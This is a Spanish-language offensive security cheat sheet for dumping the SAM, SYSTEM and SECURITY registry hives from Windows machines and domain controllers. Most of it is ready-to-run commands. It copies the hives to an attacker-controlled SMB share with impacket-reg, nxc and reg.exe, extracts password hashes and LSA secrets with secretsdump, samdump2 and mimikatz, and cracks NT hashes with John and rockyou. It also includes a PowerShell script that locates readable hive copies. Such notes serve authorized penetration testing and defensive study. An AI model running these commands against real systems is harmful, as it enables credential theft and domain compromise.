SAM, SYSTEM y SECURITY

SAM, SYSTEM y SECURITY son hives del registro usados para recuperar hashes locales y secretos LSA. Normalmente hacen falta privilegios de administrador o copias accesibles del sistema.

Hives locales del registro

Aviso: Requiere Admin para extraer SAM, SYSTEM y SECURITY

Dumpear SAM/SYSTEM/SECURITY del DC

SAM/SYSTEM

SAM: almacena hashes de usuarios locales protegidos.

SYSTEM: contiene la clave necesaria para descifrar los hashes de SAM.

SECURITY

SECURITY: almacena LSA Secrets, como credenciales de servicios, autologon u otros secretos locales.

Extraer SAM/SYSTEM SECURITY

# Kali: SMB Server 
impacket-smbserver recurso $(pwd) -smb2support

# Extraer Datos desde Kali
impacket-reg '<dominio>/<user>:<pass>@<ip_dc>' backup -o '\\<kali_ip>\recurso'
# Alternativa: Extraer Datos desde Kali
nxc smb <ip_dc> -u <user> -p <password> --sam
nxc smb <ip_dc> -u <user> -p <password> --system
nxc smb <ip_dc> -u <user> -p <password> --security
# Extraer Datos desde Windows
reg.exe save hklm\sam '\\<kali_ip>\recurso\SAM.save'
reg.exe save hklm\system '\\<kali_ip>\recurso\SYSTEM.save'
reg.exe save hklm\security '\\<kali_ip>\recurso\SECURITY.save'

Dumpear Registros

# Dumpear SAM y SECURITY (LSA Secrets)
impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
# Dumpear SAM 
impacket-secretsdump -sam SAM.save -system SYSTEM.save LOCAL
samdump2 SAM.save SYSTEM.save -o sam.txt
# Dumpear SAM con MimiKatz
lsadump::sam SYSTEM SAM
# Crackear Hash
john --format=NT --wordlist=rockyou.txt sam.txt

Otras posibles rutas de los registros

Get-ChildItem "C:\" -Recurse -File -Include SAM,SYSTEM -ErrorAction SilentlyContinue | Select-Object FullName

Enumera SAM y SYSTEM y muestra si es dumpeable

Get-ChildItem C:\ -Recurse -Force -ErrorAction SilentlyContinue |
Where-Object { $_.Name -in @("SAM","SYSTEM") } |
ForEach-Object {
    $canRead = $false
    try {
        $stream = [System.IO.File]::Open($_.FullName, 'Open', 'Read', 'None')
        $stream.Close()
        $canRead = $true
    } catch {}
    
    [PSCustomObject]@{
        Path = $_.FullName
        Dumpable = $canRead
    }
}
